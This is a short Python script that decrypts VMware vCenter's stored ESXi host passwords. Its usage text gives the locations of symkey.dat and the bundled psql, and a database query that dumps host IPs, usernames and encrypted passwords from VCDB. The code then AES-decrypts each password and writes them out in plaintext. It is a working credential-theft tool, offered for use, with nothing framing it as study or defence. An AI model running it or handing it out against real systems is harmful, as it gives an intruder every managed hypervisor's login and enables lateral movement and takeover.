import base64
import sys

from Crypto.Cipher import AES


usage = """
Where is symkey.dat
Windows：C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
Linux：/etc/vmware-vpx/ssl/symkey.dat


Where is psql
Windows: C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe
Linux: /opt/vmware/vpostgres/9.3/bin/psql
psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc

python3 decrypt.py symkey.dat password.enc password.txt
"""


def pkcs7unpadding(text):
    length = len(text)
    padding_length = ord(text[-1])
    return text[0:length-padding_length]


def decrypt(key, enc_passwords):
    passwords = []
    key_bytes = bytes.fromhex(key)
    for ip, usr, enc_password in enc_passwords:
        content = base64.b64decode(enc_password)
        iv_bytes = content[:16]
        enc_password_bytes = content[16:]
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        password_bytes = cipher.decrypt(enc_password_bytes)
        password = str(password_bytes, encoding='utf-8')
        password = pkcs7unpadding(password)
        line = f'{ip}:{usr}:{password}'
        print(line) # show the password as you save it to a file
        passwords.append(line)
    return passwords


def save_decrypt_password(path, passwords):
    data = '\n'.join(passwords)
    with open(path, 'w') as file:
        file.write(data)


def get_encrypt_password(path):
    encrypt_passwords = []
    with open(path) as file:
        for idx, line in enumerate(file):
            # print(idx, line)
            if idx <= 1:
                continue
            try:
                line = [el.strip() for el in  line.split("|")]
                ip = line[0]
                usr = line[1]
                pw = line[2]
                encrypt_password = pw.strip('*').strip()
                encrypt_passwords.append((ip,usr,encrypt_password))
            except IndexError as e:
                return encrypt_passwords #return the list up until the error...
    return encrypt_passwords


def get_key(path):
    with open(path) as file:
        key = file.read().strip()
        return key


def main():
    if len(sys.argv) != 4:
        print(usage)
        exit(1)
    key = get_key(sys.argv[1])
    encrypt_passwords = get_encrypt_password(sys.argv[2])
    save_path = sys.argv[3]
    passwords = decrypt(key, encrypt_passwords)
    save_decrypt_password(save_path, passwords)


if __name__ == '__main__':
    main()